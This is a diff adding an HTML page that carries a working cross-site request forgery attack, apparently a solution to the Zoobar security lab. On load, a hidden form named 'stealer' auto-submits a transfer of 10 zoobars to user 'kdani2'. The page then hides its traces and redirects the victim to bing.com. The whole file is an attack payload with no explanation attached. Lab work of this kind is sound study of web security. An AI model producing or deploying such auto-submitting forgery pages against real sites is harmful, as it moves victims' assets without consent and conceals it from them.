@@ -1,0 +1,18 @@
+<form id="myForm" name="stealer" method="post" action="http://zoobar.org/transfer.php" target="my_frame">
+    <input name="recipient" value="kdani2" />
+    <input name="zoobars" value="10" />
+    <!-- <input type="submit" /> -->
+    <button id="sendButton" type="submit" name="submission" value="send"></button>
+</form>
+<iframe id="temp_frame" name="my_frame" src="http://www.bing.com"></iframe>
+<script>
+    document.getElementById("sendButton").click();
+    document.getElementById("myForm").style.display = "none";
+    document.getElementById("temp_frame").style.display = "none";
+    function pageReplace() {
+        window.location.replace("http://www.bing.com");
+    }
+    setTimeout(function() {
+        pageReplace();
+    }, 50);
+</script>
